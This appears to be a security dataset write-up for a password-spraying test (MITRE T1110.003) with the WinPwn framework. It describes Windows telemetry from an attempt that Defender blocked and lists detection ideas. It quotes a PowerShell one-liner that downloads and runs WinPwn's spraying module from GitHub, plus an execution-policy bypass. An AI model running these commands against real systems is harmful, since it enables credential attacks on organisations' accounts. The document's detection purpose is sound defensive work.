# T1110.003-5: Password Spraying — WinPwn - DomainPasswordSpray Attacks

## Technique Context

T1110.003 Password Spraying is a credential access technique where adversaries attempt authentication against many accounts using commonly-used passwords, rather than attempting many passwords against a single account (to avoid lockout policies). The technique is particularly effective in Active Directory environments where organizations often have predictable password patterns or default passwords. Attackers typically target domain accounts using tools like Invoke-DomainPasswordSpray, CrackMapExec, or custom PowerShell scripts. Detection focuses on identifying unusual authentication patterns, failed logon clustering, and the tools commonly used to perform these attacks.

This specific test uses the WinPwn framework's `domainpassspray` module, which attempts to spray empty passwords against domain accounts. WinPwn is a popular post-exploitation PowerShell framework that includes various credential access capabilities.

## What This Dataset Contains

The dataset captures a PowerShell-based password spraying attempt that was blocked by Windows Defender. Key telemetry includes:

**Process Creation Chain (Security 4688 & Sysmon EID 1):**
- Parent PowerShell process creates child PowerShell with command: `"powershell.exe" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1') domainpassspray -consoleoutput -noninteractive -emptypasswords}`
- Whoami.exe execution for reconnaissance: `"C:\Windows\system32\whoami.exe"`

**PowerShell Script Block Logging (EID 4104):**
- Remote script download attempt: `{iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')`
- PowerShell module loading telemetry and execution policy bypass: `Set-ExecutionPolicy -Scope Process -Force -ExecutionPolicy Bypass`

**Windows Defender Block (PowerShell EID 4100):**
- Error message: "This script contains malicious content and has been blocked by your antivirus software"
- Blocked at ScriptContainedMaliciousContent during Invoke-Expression execution

**Network Activity (Sysmon EID 22):**
- DNS resolution for: `raw.githubusercontent.com` (resolved to GitHub CDN IPs)
- Additional Windows Defender telemetry DNS query to `ussus3eastprod.blob.core.windows.net`

**File System Activity (Sysmon EID 11):**
- PowerShell profile data creation: `C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Windows\PowerShell\StartupProfileData-Interactive` and `StartupProfileData-NonInteractive`

## What This Dataset Does Not Contain

The dataset lacks the actual password spraying activity because Windows Defender successfully blocked the malicious script download and execution. Missing elements include:

- **Domain enumeration activity** - No LDAP queries, domain controller connections, or user account enumeration
- **Authentication attempts** - No Kerberos pre-authentication failures (4771), logon failures (4625), or successful logons (4624)
- **Network connections to domain controllers** - The technique never progressed to actual credential testing
- **Active Directory-specific telemetry** - No domain account targeting or password policy enumeration
- **Tool-specific artifacts** - The WinPwn framework was never actually loaded and executed

The Security channel shows no authentication events because the attack was stopped before any credential attempts occurred.

## Assessment

This dataset demonstrates excellent preventive security controls but limited attack progression telemetry. The data is valuable for understanding:

1. **Early-stage detection opportunities** - Command line patterns, PowerShell script blocks, and remote script downloads
2. **Defensive efficacy** - Shows how modern EDR/AV solutions can prevent technique execution
3. **Attack preparation phases** - Captures reconnaissance (whoami) and environment setup

However, the dataset has limited utility for building detections of actual password spraying behavior since the core technique was blocked. Organizations wanting to understand full T1110.003 execution patterns would need data from environments where the technique completed successfully.

## Detection Opportunities Present in This Data

1. **Suspicious PowerShell command line patterns** - Detect `iex(new-object net.webclient).downloadstring` combined with GitHub raw content URLs in Security EID 4688 or Sysmon EID 1

2. **Remote script download attempts** - Monitor PowerShell Script Block Logging (EID 4104) for `net.webclient` and `downloadstring` methods targeting external repositories

3. **WinPwn framework indicators** - Alert on PowerShell command lines containing `domainpassspray`, `WinPwn.ps1`, or the specific GitHub repository path

4. **Execution policy bypass patterns** - Detect `Set-ExecutionPolicy` with `Bypass` parameter in PowerShell module logging (EID 4103)

5. **GitHub raw content DNS resolutions** - Monitor Sysmon EID 22 for DNS queries to `raw.githubusercontent.com` from PowerShell processes

6. **Antivirus block events** - Track PowerShell EID 4100 errors mentioning "malicious content" as potential attack attempts

7. **Process chain analysis** - Correlate parent-child PowerShell relationships where child processes have suspicious command line arguments

8. **Reconnaissance activity clustering** - Detect whoami.exe execution in temporal proximity to suspicious PowerShell activity
